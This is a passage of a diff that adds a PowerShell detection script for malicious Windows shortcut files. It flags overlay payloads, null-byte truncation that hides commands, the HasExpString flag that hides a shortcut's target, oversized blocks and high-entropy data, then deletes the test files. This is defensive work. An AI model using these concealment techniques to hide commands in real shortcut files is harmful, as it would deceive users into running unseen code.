+            if ($overlayData -contains 0x1F -and $overlayData.Length -gt 2 -and $overlayData[1] -eq 0x8B) {
+                Write-Host "    [!] gzip compression detected (1F 8B header)" -ForegroundColor Red
+            }
+
+            Write-Host "    Status: MALICIOUS" -ForegroundColor Red
+        }
+    }
+}
+
+Write-Host ""
+
+# ============================================================================
+# ANALYSIS 3: Null Byte Truncation
+# ============================================================================
+
+Write-Host "ANALYSIS 3: Null-Byte String Truncation Detection" -ForegroundColor Green
+Write-Host "═══════════════════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$file3 = "$testDir\lnk_null_byte_truncation.lnk"
+if (Test-Path $file3) {
+    $lnk3 = [System.IO.File]::ReadAllBytes($file3)
+
+    Write-Host "File: $(Split-Path $file3 -Leaf)"
+    Write-Host "Size: $($lnk3.Length) bytes"
+    Write-Host ""
+
+    # Find string data with null bytes
+    Write-Host "Scanning for null-byte patterns in string data:" -ForegroundColor Yellow
+
+    $foundNullBytes = $false
+    for ($i = 76; $i -lt $lnk3.Length - 3; $i++) {
+        # Look for non-null, null, null, non-null pattern (typical in UTF-16)
+        if ($lnk3[$i] -ne 0 -and $lnk3[$i+1] -eq 0 -and $lnk3[$i+2] -eq 0 -and $lnk3[$i+3] -ne 0) {
+            $foundNullBytes = $true
+
+            Write-Host ""
+            Write-Host "[!] DETECTION: Null-byte pattern found at offset 0x$($i.ToString('X4'))" -ForegroundColor Red
+            Show-HexDump -Data $lnk3 -StartOffset ($i - 8) -Length 32
+            Write-Host ""
+            Write-Host "    Interpretation:"
+            Write-Host "      Before null: Valid string (truncated here by parser)"
+            Write-Host "      After null: Hidden command (executed by Windows)"
+            Write-Host "    Status: MALICIOUS" -ForegroundColor Red
+            break
+        }
+    }
+
+    if (-not $foundNullBytes) {
+        Write-Host "[✓] No obvious null-byte truncation patterns detected"
+    }
+}
+
+Write-Host ""
+
+# ============================================================================
+# ANALYSIS 4: HasExpString Flag
+# ============================================================================
+
+Write-Host "ANALYSIS 4: HasExpString Flag Detection" -ForegroundColor Green
+Write-Host "═════════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$file4 = "$testDir\lnk_hasexpstring_flag.lnk"
+if (Test-Path $file4) {
+    $lnk4 = [System.IO.File]::ReadAllBytes($file4)
+
+    Write-Host "File: $(Split-Path $file4 -Leaf)"
+    Write-Host "Size: $($lnk4.Length) bytes"
+    Write-Host ""
+
+    Write-Host "LinkFlags at offset 0x14:" -ForegroundColor Yellow
+    Show-HexDump -Data $lnk4 -StartOffset 0x14 -Length 4
+    Write-Host ""
+
+    $flagBytes = $lnk4[0x14..0x17]
+    $flags = [BitConverter]::ToUInt32($flagBytes, 0)
+
+    $bit9 = ($flags -shr 9) -band 0x01
+
+    Write-Host "Analysis:" -ForegroundColor Yellow
+    Write-Host "  Bit 9 (HasExpString): $bit9"
+    Write-Host ""
+
+    if ($bit9 -eq 1) {
+        Write-Host "[!] DETECTION: HasExpString flag is SET!" -ForegroundColor Red
+        Write-Host "    Effect: Target field HIDDEN from Properties dialog"
+        Write-Host "    Windows behavior: Still expands environment variables"
+        Write-Host "    User sees: Nothing (blank target field)"
+        Write-Host "    Actually executes: Environmental variable target (invisible)"
+        Write-Host "    Status: MALICIOUS" -ForegroundColor Red
+    } else {
+        Write-Host "[✓] HasExpString flag is clear (normal)" -ForegroundColor Green
+    }
+}
+
+Write-Host ""
+
+# ============================================================================
+# ANALYSIS 5: Oversized Block
+# ============================================================================
+
+Write-Host "ANALYSIS 5: Oversized DataBlock Detection" -ForegroundColor Green
+Write-Host "═════════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$file5 = "$testDir\lnk_oversized_block.lnk"
+if (Test-Path $file5) {
+    $lnk5 = [System.IO.File]::ReadAllBytes($file5)
+
+    Write-Host "File: $(Split-Path $file5 -Leaf)"
+    Write-Host "Size: $($lnk5.Length) bytes"
+    Write-Host ""
+
+    # Find icon block (signature 0xA0000004)
+    for ($i = 76; $i -lt $lnk5.Length - 8; $i++) {
+        $sig = [BitConverter]::ToUInt32($lnk5[($i+4)..($i+7)], 0)
+        if ($sig -eq 0xA0000004) {
+            $blockSize = [BitConverter]::ToUInt32($lnk5[$i..($i+3)], 0)
+
+            Write-Host "IconEnvironmentDataBlock found at offset 0x$($i.ToString('X4'))" -ForegroundColor Yellow
+            Write-Host ""
+            Write-Host "Block header:" -ForegroundColor Yellow
+            Show-HexDump -Data $lnk5 -StartOffset $i -Length 8
+            Write-Host ""
+
+            Write-Host "Analysis:" -ForegroundColor Yellow
+            Write-Host "  BlockSize field value: 0x$('{0:X4}' -f $blockSize) ($blockSize bytes)"
+            Write-Host "  Actual content: ~50 bytes"
+            Write-Host "  Unused space: ~$($blockSize - 50) bytes"
+            Write-Host ""
+
+            if ($blockSize -gt 256) {
+                Write-Host "[!] DETECTION: Oversized block!" -ForegroundColor Red
+                Write-Host "    Allocated: $blockSize bytes"
+                Write-Host "    Used: ~50 bytes"
+                Write-Host "    Unused: ~$($blockSize - 50) bytes (can hide payload)"
+                Write-Host "    Status: SUSPICIOUS" -ForegroundColor Red
+            }
+
+            break
+        }
+    }
+}
+
+Write-Host ""
+
+# ============================================================================
+# ANALYSIS 6: Entropy
+# ============================================================================
+
+Write-Host "ANALYSIS 6: Entropy-Based Anomaly Detection" -ForegroundColor Green
+Write-Host "═════════════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$file6 = "$testDir\lnk_high_entropy_overlay.lnk"
+if (Test-Path $file6) {
+    $lnk6 = [System.IO.File]::ReadAllBytes($file6)
+
+    Write-Host "File: $(Split-Path $file6 -Leaf)"
+    Write-Host "Size: $($lnk6.Length) bytes"
+    Write-Host ""
+
+    # Calculate entropy of entire file
+    $totalEntropy = Get-Entropy -Data $lnk6
+
+    # Find terminator and calculate overlay entropy
+    for ($i = 0; $i -lt $lnk6.Length - 3; $i++) {
+        if ($lnk6[$i] -eq 0 -and $lnk6[$i+1] -eq 0 -and $lnk6[$i+2] -eq 0 -and $lnk6[$i+3] -eq 0) {
+            $overlayStart = $i + 4
+            $overlayData = $lnk6[$overlayStart..($lnk6.Length-1)]
+            $overlayEntropy = Get-Entropy -Data $overlayData
+
+            Write-Host "Entropy Analysis:" -ForegroundColor Yellow
+            Write-Host "  Total file entropy: $totalEntropy bits/byte"
+            Write-Host "  Overlay entropy: $overlayEntropy bits/byte"
+            Write-Host ""
+            Write-Host "  Normal LNK entropy: 3.0-5.5 bits/byte"
+            Write-Host "  Compressed payload: 7.0-8.0 bits/byte"
+            Write-Host ""
+
+            if ($overlayEntropy -gt 6.5) {
+                Write-Host "[!] DETECTION: High entropy overlay!" -ForegroundColor Red
+                Write-Host "    Overlay entropy: $overlayEntropy (threshold: 6.5)"
+                Write-Host "    Indicates: Compressed/encrypted payload"
+                Write-Host "    Status: MALICIOUS" -ForegroundColor Red
+            }
+
+            break
+        }
+    }
+}
+
+Write-Host ""
+
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "[*] ANALYSIS COMPLETE" -ForegroundColor Cyan
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "Summary:" -ForegroundColor Yellow
+Write-Host "  - Reserved flags: Easily detected (should be 0)"
+Write-Host "  - Overlay data: Detected via file size check"
+Write-Host "  - Null bytes: Detected via hex pattern matching"
+Write-Host "  - HasExpString: Detected via flag inspection"
+Write-Host "  - Oversized blocks: Detected via block size validation"
+Write-Host "  - High entropy: Detected via entropy calculation"
+Write-Host ""
+Write-Host "[NEXT STEP]:" -ForegroundColor Cyan
+Write-Host "  Run: 3_CLEANUP_BINARY.ps1" -ForegroundColor White
+Write-Host ""
+
+# ============================================================================
+# SCRIPT 3: CLEANUP - Remove binary test LNK files
+# ============================================================================
+
+Write-Host ""
+Write-Host "╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║  STEP 3: CLEANUP - Remove binary test files                  ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+
+$testDir = "$env:TEMP\LNK_Binary_Tests"
+
+Write-Host "[*] Cleaning up: $testDir" -ForegroundColor Yellow
+Write-Host ""
+
+if (Test-Path $testDir) {
+    $files = Get-ChildItem -Path $testDir -File
+
+    if ($files.Count -gt 0) {
+        Write-Host "[*] Found $($files.Count) test files:"
+        Write-Host ""
+
+        foreach ($file in $files) {
+            Write-Host "  - $($file.Name)" -ForegroundColor White
+        }
+
+        Write-Host ""
+        Write-Host "[*] Removing test directory and files..."
+
+        try {
+            Remove-Item -Path $testDir -Recurse -Force -ErrorAction Stop
+            Write-Host "[✓] Test directory removed: $testDir" -ForegroundColor Green
+        } catch {
+            Write-Host "[!] Error removing directory: $_" -ForegroundColor Red
+        }
+    } else {
+        Write-Host "No test files found in: $testDir"
+    }
+} else {
+    Write-Host "[*] Test directory not found: $testDir" -ForegroundColor Yellow
+}
+
+Write-Host ""
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "[✓] CLEANUP COMPLETE" -ForegroundColor Cyan
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host ""
+
